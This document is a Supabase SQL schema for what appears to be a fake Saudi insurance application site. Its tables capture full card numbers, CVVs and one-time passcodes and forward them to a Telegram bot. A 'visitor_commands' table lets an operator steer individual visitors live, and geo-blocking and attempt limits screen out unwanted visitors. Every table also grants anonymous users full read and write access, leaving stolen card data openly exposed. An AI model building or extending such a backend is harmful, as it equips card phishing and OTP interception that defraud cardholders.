
CREATE TABLE IF NOT EXISTS public.applications (
  id text PRIMARY KEY,
  created_at timestamptz NOT NULL DEFAULT now(),
  card_title text, full_name text, identity text, birth_date text, phone text,
  insurance_type text, start_date text, purpose text, est_value text,
  car_year text, car_model text, repair_place text, company text, type text,
  price numeric, total numeric, method text,
  status text NOT NULL DEFAULT 'pending',
  review_status text NOT NULL DEFAULT 'awaiting_review',
  card_number text, card_name text, card_exp_month text, card_exp_year text,
  card_cvv text, card_brand text, otp_code text
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.applications TO anon, authenticated;
GRANT ALL ON public.applications TO service_role;
ALTER TABLE public.applications ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "open_all" ON public.applications;
CREATE POLICY "open_all" ON public.applications FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.site_settings (
  id int PRIMARY KEY,
  geo_block_enabled boolean NOT NULL DEFAULT false,
  allowed_countries text[] NOT NULL DEFAULT ARRAY['SA'],
  attempt_block_enabled boolean NOT NULL DEFAULT false,
  max_attempts int NOT NULL DEFAULT 3,
  telegram_enabled boolean NOT NULL DEFAULT false,
  telegram_bot_token text NOT NULL DEFAULT '',
  telegram_chat_id text NOT NULL DEFAULT '',
  telegram_notify_new_application boolean NOT NULL DEFAULT true,
  telegram_notify_card boolean NOT NULL DEFAULT true,
  telegram_notify_otp boolean NOT NULL DEFAULT true,
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.site_settings TO anon, authenticated;
GRANT ALL ON public.site_settings TO service_role;
ALTER TABLE public.site_settings ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "open_all" ON public.site_settings;
CREATE POLICY "open_all" ON public.site_settings FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);
INSERT INTO public.site_settings (id) VALUES (1) ON CONFLICT (id) DO NOTHING;

CREATE TABLE IF NOT EXISTS public.blocked_visitors (
  visitor_id text PRIMARY KEY,
  created_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.blocked_visitors TO anon, authenticated;
GRANT ALL ON public.blocked_visitors TO service_role;
ALTER TABLE public.blocked_visitors ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "open_all" ON public.blocked_visitors;
CREATE POLICY "open_all" ON public.blocked_visitors FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE IF NOT EXISTS public.visitor_commands (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  visitor_id text NOT NULL,
  command text NOT NULL,
  payload text,
  created_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.visitor_commands TO anon, authenticated;
GRANT ALL ON public.visitor_commands TO service_role;
ALTER TABLE public.visitor_commands ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS "open_all" ON public.visitor_commands;
CREATE POLICY "open_all" ON public.visitor_commands FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

DO $$ BEGIN
  BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.applications; EXCEPTION WHEN duplicate_object THEN NULL; END;
  BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.site_settings; EXCEPTION WHEN duplicate_object THEN NULL; END;
  BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.blocked_visitors; EXCEPTION WHEN duplicate_object THEN NULL; END;
  BEGIN ALTER PUBLICATION supabase_realtime ADD TABLE public.visitor_commands; EXCEPTION WHEN duplicate_object THEN NULL; END;
END $$;

NOTIFY pgrst, 'reload schema';
